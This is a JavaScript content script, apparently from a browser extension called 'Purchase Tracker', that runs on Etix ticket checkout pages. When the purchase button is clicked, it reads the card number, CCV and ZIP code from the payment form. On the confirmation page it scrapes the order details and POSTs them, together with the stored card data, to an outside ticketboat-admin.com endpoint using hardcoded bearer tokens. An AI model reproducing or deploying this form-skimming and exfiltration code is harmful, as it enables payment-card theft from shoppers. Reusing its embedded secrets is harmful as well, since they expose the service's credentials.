$(window).on("load", function () {
  console.log("Hi, I am Etix.js on Window load :)");
});
$(document).ready(async function () {
  console.log("Hi, I am Etix.js on Document ready :)");
  if (window.location.pathname === "/ticket/mvc/legacyOnlineSale/performance/sale/deliverOrder") {
    scrape_confirmation_data_etix();
  }
  if (window.location.pathname === "/ticket/mvc/legacyOnlineSale/performance/sale/displayPrice") {
    // purchase button
    $("#invoice-submit-btn").on("click", async function () {
      const tickets_table = {
        total: null,
        zip: null,
        ccv: null,
        card: null,
        tickets: [],
      };

      $("#miscTicketsList")
        .children()
        .each(function (index_tr, tr) {
          const tr_data = {};
          $(this)
            .children()
            .each(function (index_td, td) {
              tr_data[$(this).attr("data-title")] = $(this).text().replace(/[\n]+/g, "").trim();
            });
          tickets_table.tickets.push(tr_data);
        })
        .promise()
        .done(async function () {
          tickets_table.total = $("#order-total-price").text();
          tickets_table.zip = $("#zip").val();
          tickets_table.ccv = $("#ccv").val();
          tickets_table.card = $("#cc-number").val();
          await chrome.storage.local.set({ ["tickets_table"]: tickets_table });
          let result = await chrome.storage.local.get(["tickets_table"]);
          console.log("Etix Tickets Table", result);
        });
    });
  }
});

chrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {
  if (request.cmd === "save_confirmation_capture") {
    save_confirmation_capture(request.image);
  }
});

// fetch ticketmaster_confirmation_page
async function scrape_confirmation_data_etix() {
  try {
    // add  email
    await chrome.runtime.sendMessage({ cmd: "get_email", content: "" });
    let result = await chrome.storage.local.get(["email"]);
    let result_tickets = await await chrome.storage.local.get(["tickets_table"]);

    // build confirmation res
    const confirmation_res_etix = {
      id: Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7) + Math.random().toString().substring(2, 7),
      created: new Date(),
      type: "purchase_confirmation_etix",
      data: { tickets: result_tickets["tickets_table"], order: $("#order_id").text(), paid: $("#orderId > div > div > div.col-12.col-lg-6.text-lg-right > strong").text(), event_date: $("#order-details > div > div > div:nth-child(4)").text(), address: $("#order-details > div > div > div:nth-child(6)").text(), title: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").text(), link: $("#order-details > div > div > div.col-12.col-lg-8 > h2 > strong > a").attr("href") },
      email: result["email"],
    };
    console.log("confirmation_res_etix", confirmation_res_etix);
    // send message to dashboard
    chrome.runtime.sendMessage({ cmd: "add_indexeddb_record_etix", confirmation_res_etix: confirmation_res_etix });
    // automaically take confirmation page screenshot
    chrome.runtime.sendMessage({ cmd: "confirmation_capture" });
    // post confirmation data to db
    post_confirmation_data_etix(confirmation_res_etix);
  } catch (err) {
    console.warn({ where: "Error in  get_confirmation_data_etix", e: err });
  } finally {
  }
}
async function post_confirmation_data_etix(confirmation_res_etix) {
  try {
    //const url = "https://browser-data-capture-api-staging.ticketboat-admin.com/store_browser_data";
    const url = "https://browser-data-capture-api.ticketboat-admin.com/store_browser_data";
    const response = await fetch(url, {
      //credentials: "include",
      method: "POST",
      headers: {
        /* Authorization: "Bearer c703542300f64fc1ad0b28272e3d9a35", */
        Authorization: "Bearer 49b996be420e48a0ae4beae399438c78",
        Accept: "/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
      },

      body: JSON.stringify(confirmation_res_etix),
    });

    if (response.status === 200) {
      // logic for successful response

      const res = await response.json();
      console.log("Purchase Tracker post_confirmation_data_etix Response : Success");
      console.log(res);
    } else {
    }
  } catch (err) {
    console.warn({ where: "Error in post_confirmation_data_etix", e: err });
  }
}

function save_confirmation_capture(image) {
  let a = document.createElement("a");
  a.download = "capture_confirmation_etix.png";
  a.href = image;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}
